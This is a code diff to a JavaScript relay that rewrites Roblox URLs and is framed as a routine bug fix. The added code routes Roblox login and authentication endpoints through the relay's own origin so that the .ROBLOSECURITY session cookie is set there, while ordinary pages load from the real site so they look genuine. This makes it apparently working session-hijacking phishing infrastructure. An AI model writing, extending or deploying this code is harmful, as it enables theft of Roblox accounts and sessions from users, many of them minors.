@@ -30,14 +30,36 @@
         'static.rbxcdn.com': '/staticrbx/'
     };
 
-    // Hosts that must never be routed through the relay. www.roblox.com used to
-    // be mapped to '/' here, which turned the login page's own POST /v2/login
-    // into a request for our /v2/login — 404 at best, an infinite reload of
-    // login.php at worst.
+    // Hosts that must never be routed through the relay wholesale. www.roblox.com
+    // used to be mapped to '/' here, which turned the login page's own POST
+    // /v2/login into a request for our /v2/login — 404 at best, an infinite
+    // reload at worst. But passing it through entirely is the OTHER bug: Roblox
+    // then sets .ROBLOSECURITY on *.roblox.com, the browser keeps it there, and
+    // this host never sees the cookie. So www.roblox.com is passthrough for
+    // ordinary navigation and relayed for the authentication endpoints that mint
+    // or consume a session.
     var PASSTHROUGH = {
         'www.roblox.com': true,
         'roblox.com': true
     };
+
+    // Paths whose response carries .ROBLOSECURITY, or which need the session
+    // cookie attached. These must run on our origin so the cookie lands here.
+    var AUTH_PATHS = [
+        /^\/v2\/(login|authenticate|logout|signout)(\?|$)/i,
+        /^\/v1\/authentication[\w-]*(\/|$)/i,
+        /^\/v1\/login(\/|$)/i,
+        /^\/users\/authenticated(\/|$)/i,
+        /^\/mobile\/login(\/|$)/i,
+        /^\/login(\/|$)/i
+    ];
+
+    function isAuthPath(pathname) {
+        for (var i = 0; i < AUTH_PATHS.length; i++) {
+            if (AUTH_PATHS[i].test(pathname)) return true;
+        }
+        return false;
+    }
 
     function isRobloxHost(host) {
         return /(^|\.)roblox\.com$/i.test(host) ||
@@ -75,7 +97,15 @@
         var host = parsed.hostname.toLowerCase();
 
         if (!isRobloxHost(host)) return url;
-        if (PASSTHROUGH[host]) return url;
+
+        // www.roblox.com: relay only the auth endpoints. Everything else stays
+        // on the real site so the page keeps rendering.
+        if (PASSTHROUGH[host]) {
+            if ((host === 'www.roblox.com' || host === 'roblox.com') && isAuthPath(parsed.pathname)) {
+                return buildRelayUrl({ hostname: 'www.roblox.com', pathname: parsed.pathname, search: parsed.search });
+            }
+            return url;
+        }
 
         if (CDN_MAP.hasOwnProperty(host)) {
             return CDN_MAP[host] + parsed.pathname.replace(/^\//, '') + parsed.search;
